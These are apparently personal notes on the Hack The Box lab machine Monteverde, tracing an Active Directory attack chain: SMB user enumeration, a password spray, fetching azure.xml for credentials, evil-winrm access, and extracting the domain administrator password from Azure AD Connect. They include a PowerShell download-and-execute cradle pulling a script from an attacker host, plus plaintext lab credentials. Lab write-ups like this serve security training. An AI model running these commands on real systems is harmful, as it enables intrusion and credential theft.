### writeups
* https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html#enumeration
* https://blog.xpnsec.com/azuread-connect-for-redteam/

### SMB
```bash
❯ crackmapexec smb 10.129.98.158 --users

SMB         10.129.98.158   445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.98.158   445    MONTEVERDE       [-] Error enumerating domain users using dc ip 10.129.98.158: NTLM needs domain\username and a password
SMB         10.129.98.158   445    MONTEVERDE       [*] Trying with SAMRPC protocol
SMB         10.129.98.158   445    MONTEVERDE       [+] Enumerated domain user(s)
SMB         10.129.98.158   445    MONTEVERDE       MEGABANK.LOCAL\Guest                          Built-in account for guest access to the computer/domain
SMB         10.129.98.158   445    MONTEVERDE       MEGABANK.LOCAL\AAD_987d7f2f57d2               Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.                                                                                                                                                 
SMB         10.129.98.158   445    MONTEVERDE       MEGABANK.LOCAL\mhope                          
SMB         10.129.98.158   445    MONTEVERDE       MEGABANK.LOCAL\SABatchJobs                    
SMB         10.129.98.158   445    MONTEVERDE       MEGABANK.LOCAL\svc-ata                        
SMB         10.129.98.158   445    MONTEVERDE       MEGABANK.LOCAL\svc-bexec                      
SMB         10.129.98.158   445    MONTEVERDE       MEGABANK.LOCAL\svc-netapp                     
SMB         10.129.98.158   445    MONTEVERDE       MEGABANK.LOCAL\dgalanos                       
SMB         10.129.98.158   445    MONTEVERDE       MEGABANK.LOCAL\roleary                        
SMB         10.129.98.158   445    MONTEVERDE       MEGABANK.LOCAL\smorgan
```

### Credential Brute Force
`crackmapexec smb $IP -u users.txt -p users.txt --continue-on-success`

SMB         10.129.98.158   445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 

### Azure XML
```bash
smbclient -U SABatchJobs //$IP/users$ SABatchJobs -c 'get mhope/azure.xml azure.xml'

crackmapexec winrm $IP -u mhope -p '4n0therD4y@n0th3r$'
```

### evil Shell
```bash
evil-winrm -i $IP -u mhope -p '4n0therD4y@n0th3r$'
```

### Enum
##### Azure Admins
```cmd
*Evil-WinRM* PS C:\Users\mhope\Desktop> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 3:40:05 PM
Password expires             Never
Password changeable          1/3/2020 3:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   1/15/2023 7:25:08 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.
```

### Root by Get-MSOLCredentials
##### 0xdf
`iex(new-object net.webclient).downloadstring('http://10.10.16.13/xdf.ps1')`

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!

##### Offical
```cmd
❯ evil-winrm -i $IP -u mhope -p '4n0therD4y@n0th3r$' -s .

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> offical.ps1
*Evil-WinRM* PS C:\Users\mhope\Documents> Get-ADConnectPassword
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

